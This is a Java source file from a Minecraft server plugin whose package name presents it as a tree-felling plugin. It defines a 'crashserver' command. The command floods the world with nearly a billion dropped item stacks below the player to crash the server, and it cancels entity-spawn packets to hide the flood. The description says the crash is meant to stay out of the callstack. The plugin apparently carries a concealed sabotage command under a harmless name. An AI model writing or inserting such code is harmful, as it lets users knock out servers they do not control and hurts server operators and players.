package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.minecraft.server.v1_15_R1.PacketPlayOutSpawnEntity;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import java.util.ArrayList;

@Command.Info(command = "crashserver", description = "Tries to crash the server without showing up in callstack.", category = CommandCategory.Server)
public class CrashServer extends Command {
    boolean isOn = false;
    public CrashServer() {
        PacketInjector.addPacketListener(this);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is crashing the server!");
        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + "Crashing!");
        isOn = true;
        ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS);
        stack.setAmount(127);
        for (int i = 0; i < 999999999; i++) {
            Item item = p.getWorld().dropItemNaturally(p.getLocation().subtract(0, 200, 0), stack);
        }
        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + "Done! Server should crash any second now!");
    }

    @Override
    public void onPacketSend(PacketEvent packetEvent) {
        if(!isOn) return;
        if (packetEvent.getPacket().getPacketClass() != PacketPlayOutSpawnEntity.class) return;
        packetEvent.setCancelled(true);
    }
}
